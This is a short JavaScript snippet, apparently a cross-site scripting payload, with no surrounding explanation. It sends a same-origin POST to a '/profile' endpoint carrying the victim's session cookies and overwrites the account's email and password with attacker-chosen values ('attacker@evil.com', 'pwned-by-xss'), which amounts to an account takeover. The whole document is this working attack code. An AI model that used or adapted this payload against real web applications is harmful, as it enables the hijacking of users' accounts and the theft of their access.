fetch('/profile', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'email=attacker@evil.com&password=pwned-by-xss',
  credentials: 'include'
});
